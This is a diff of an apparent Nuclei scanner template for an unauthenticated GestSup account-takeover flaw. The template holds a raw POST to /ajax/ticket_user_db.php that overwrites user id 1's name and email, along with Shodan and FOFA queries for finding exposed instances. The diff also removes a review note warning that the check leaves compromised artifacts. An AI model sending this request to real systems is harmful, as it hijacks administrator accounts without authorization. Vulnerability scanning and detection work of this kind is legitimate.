@@ -1,4 +1,5 @@
 id: gestsup-account-takeover
+
 info:
   name: GestSup - Account Takeover
   author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
@@ -14,43 +15,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
     cvss-score: 9.8
-    cve-id: CVE-2024-23163
     cwe-id: CWE-287
     cpe: cpe:2.3:a:gestsup:gestsup:*:*:*:*:*:*:*:*
   metadata:
-    runzero-review: REJECT/2026-08-17/potentially leaves behind compromised artifacts
-    fofa-query: title="GestSup"
-    max-request: 1
-    product: gestsup
-    shodan-query: http.favicon.hash:-283003760
-    vendor: gestsup
     verified: true
+    max-request: 1
+    vendor: gestsup
+    fofa-query: title="GestSup"
+    shodan-query: http.favicon.hash:-283003760
+    product: gestsup
   tags: account-takeover,gestsup,vuln
-variables:
-  email: '{{randstr}}@{{rand_base(5)}}.com'
-  firstname: '{{rand_base(5)}}'
-  lastname: '{{rand_base(5)}}'
-http:
-  - extractors:
-      - dsl:
-          - '"Firstname: "+ firstname'
-          - '"Lastname: "+ lastname'
-        # digest: 4b0a004830460221008edfd9864003c6f7b01bfe5fe1bfccb3298e6dc1624a426ca8d2805385864be1022100cc5c4b9852e70111619b23ecc9b742aec0dff7f37a4f7fa6f5827073957f7c5e:922c64590222798bb761d5b6d8e72950
 
-        type: dsl
-    matchers:
-      - condition: and
-        part: body
-        type: word
-        words:
-          - '{"status":"success'
-          - firstname":"{{firstname}}","lastname":"{{lastname}}
-      - part: header
-        type: word
-        words:
-          - text/html
-    matchers-condition: and
-    raw:
+variables:
+  email: "{{randstr}}@{{rand_base(5)}}.com"
+  firstname: "{{rand_base(5)}}"
+  lastname: "{{rand_base(5)}}"
+
+http:
+  - raw:
       - |
         POST /ajax/ticket_user_db.php HTTP/1.1
         Host: {{Hostname}}
@@ -58,3 +40,24 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         modifyuser=1&lastname={{lastname}}&firstname={{firstname}}&phone=&mobile=&mail={{email}}&company=111&id=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"status":"success'
+          - 'firstname":"{{firstname}}","lastname":"{{lastname}}'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"Firstname: "+ firstname'
+          - '"Lastname: "+ lastname'
+# digest: 4b0a004830460221008edfd9864003c6f7b01bfe5fe1bfccb3298e6dc1624a426ca8d2805385864be1022100cc5c4b9852e70111619b23ecc9b742aec0dff7f37a4f7fa6f5827073957f7c5e:922c64590222798bb761d5b6d8e72950
